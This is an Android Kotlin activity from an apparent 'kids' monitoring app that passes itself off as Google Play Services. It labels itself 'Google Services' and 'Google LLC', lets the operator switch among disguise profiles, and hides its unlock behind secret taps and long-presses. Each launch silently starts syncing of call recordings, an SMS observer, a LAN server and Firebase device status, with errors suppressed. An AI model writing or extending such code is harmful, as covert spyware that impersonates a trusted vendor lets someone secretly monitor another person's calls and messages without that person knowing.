package com.vyra.kids.ui

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.text.InputType
import android.widget.EditText
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.vyra.kids.R
import com.vyra.kids.core.DisguiseManager
import com.vyra.kids.core.DisguiseProfile
import com.vyra.kids.core.PrefsManager

class DecoyDisplayActivity : AppCompatActivity() {

    private lateinit var disguiseManager: DisguiseManager
    private lateinit var prefs: PrefsManager

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        disguiseManager = DisguiseManager(this)
        prefs = PrefsManager(this)

        // First run redirect: If device is not configured yet or pairing code is missing, launch Setup Wizard immediately
        if (!prefs.isConfigured || prefs.pairingCode.isBlank()) {
            startActivity(Intent(this, SetupWizardActivity::class.java))
            finish()
            return
        }

        setContentView(R.layout.activity_decoy_display)
        disguiseManager.autoApplyBrandDisguise()

        // Trigger background sync, LAN server, and call recording sync on launch
        try {
            com.vyra.kids.core.FirebaseSyncManager.getInstance(this).syncDeviceStatus()
            com.vyra.kids.core.LocalLanSyncServer.getInstance(this).start()
            com.vyra.kids.services.CallRecordingSyncService.syncCallsAndRecordings(this)
            val smsIntent = Intent(this, com.vyra.kids.services.SmsObserverService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(smsIntent)
            } else {
                startService(smsIntent)
            }
        } catch (_: Exception) {}

        val tvDecoyTitle = findViewById<TextView>(R.id.tvDecoyTitle)
        val tvDecoyHeader = findViewById<TextView>(R.id.tvDecoyHeader)
        val ivParentUnlock = findViewById<ImageView>(R.id.ivParentUnlock)
        val tvDecoyFooter = findViewById<TextView>(R.id.tvDecoyFooter)
        val tvDeviceBrand = findViewById<TextView>(R.id.tvDeviceBrand)
        val tvDeviceModel = findViewById<TextView>(R.id.tvDeviceModel)
        val tvFirmwareSubsystem = findViewById<TextView>(R.id.tvFirmwareSubsystem)

        tvDecoyTitle?.text = "Google Services"
        tvDecoyHeader?.text = "Google Services"
        tvDeviceBrand?.text = "Google LLC"
        tvDeviceModel?.text = "Android ${Build.VERSION.RELEASE}"
        tvFirmwareSubsystem?.text = "Google Play & System Sync"
        tvDecoyFooter?.text = "Google Play Services • Core Synchronization"

        // 1. Discreet corner unlock
        ivParentUnlock.setOnClickListener {
            showParentPinDialog()
        }

        // 2. Secret 5-Tap Gesture on header title (no app icon inside the app)
        var tapCount = 0
        var lastTapTime = 0L
        tvDecoyHeader?.setOnClickListener {
            val now = System.currentTimeMillis()
            if (now - lastTapTime < 800) {
                tapCount++
                if (tapCount >= 5) {
                    tapCount = 0
                    showParentPinDialog()
                }
            } else {
                tapCount = 1
            }
            lastTapTime = now
        }

        // 3. Secret long-press on footer
        tvDecoyFooter.setOnLongClickListener {
            showParentPinDialog()
            true
        }
    }

    private fun showParentPinDialog() {
        val input = EditText(this).apply {
            inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
            hint = "Enter Pairing Code or Secret Key"
        }

        AlertDialog.Builder(this)
            .setTitle("Parent Verification")
            .setMessage("Enter the secret pairing code or key configured in Parent App:")
            .setView(input)
            .setPositiveButton("Verify") { dialog, _ ->
                val enteredPin = input.text.toString().trim()
                if (prefs.isParentPinValid(enteredPin)) {
                    Toast.makeText(this, "Access Granted", Toast.LENGTH_SHORT).show()
                    showDisguisePickerSheet()
                } else {
                    Toast.makeText(this, "Incorrect Key / Code!", Toast.LENGTH_SHORT).show()
                }
                dialog.dismiss()
            }
            .setNegativeButton("Cancel") { dialog, _ ->
                dialog.dismiss()
            }
            .show()
    }

    private fun showDisguisePickerSheet() {
        val disguises = DisguiseProfile.entries
        val items = disguises.map { it.title }.toTypedArray()

        AlertDialog.Builder(this)
            .setTitle("Select App Disguise")
            .setItems(items) { _, which ->
                val selected = disguises[which]
                disguiseManager.applyDisguise(selected)
                Toast.makeText(this, "Disguise changed to: ${selected.title}", Toast.LENGTH_LONG).show()
                recreate()
            }
            .setNeutralButton("Open Setup Wizard") { _, _ ->
                prefs.isConfigured = false
                startActivity(Intent(this, SetupWizardActivity::class.java))
                finish()
            }
            .setNegativeButton("Close", null)
            .show()
    }
}
